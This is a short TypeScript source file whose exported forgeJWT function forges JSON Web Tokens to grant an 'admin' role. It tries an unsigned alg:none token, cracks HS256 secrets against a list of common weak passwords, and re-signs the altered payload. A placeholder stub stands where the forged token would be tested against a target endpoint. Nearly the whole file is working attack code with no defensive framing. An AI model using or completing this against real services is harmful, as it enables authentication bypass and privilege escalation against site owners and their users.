import crypto from "crypto";

function b64url(input: Buffer) {
  return input.toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

export async function forgeJWT(jwtToken: string, targetRole = "admin"): Promise<string | null> {
  const parts = jwtToken.split(".");
  if (parts.length < 2) return null;

  const [headerB64, payloadB64] = parts;

  // alg:none
  const noneToken = `${headerB64}.${payloadB64}.`;
  if (await testToken(noneToken)) return noneToken;

  // crack HS256 with tiny wordlist (placeholder)
  const secret = await crackJWTSecret(jwtToken);
  if (secret) {
    const forged = signHS256(payloadB64, { alg: "HS256", typ: "JWT" }, secret, targetRole);
    if (await testToken(forged)) return forged;
  }

  return null;
}

async function testToken(token: string): Promise<boolean> {
  // placeholder: always returns false until wired to a target endpoint
  return false;
}

async function crackJWTSecret(token: string): Promise<string | null> {
  const [headerB64, payloadB64, sigB64] = token.split(".");
  if (!sigB64) return null;
  const msg = Buffer.from(`${headerB64}.${payloadB64}`);
  const sig = Buffer.from(sigB64.replace(/-/g, "+").replace(/_/g, "/"), "base64");
  const candidates = ["secret", "changeme", "password", "admin", "jwtsecret"];
  for (const c of candidates) {
    const mac = crypto.createHmac("sha256", c).update(msg).digest();
    if (crypto.timingSafeEqual(mac, sig)) return c;
  }
  return null;
}

function signHS256(payloadB64: string, header: any, secret: string, role: string): string {
  const newPayload = Buffer.from(
    JSON.stringify({ ...JSON.parse(Buffer.from(payloadB64, "base64").toString() || "{}"), role })
  );
  const headerB64 = b64url(Buffer.from(JSON.stringify(header)));
  const payloadNewB64 = b64url(newPayload);
  const sig = crypto.createHmac("sha256", secret).update(`${headerB64}.${payloadNewB64}`).digest();
  return `${headerB64}.${payloadNewB64}.${b64url(sig)}`;
}
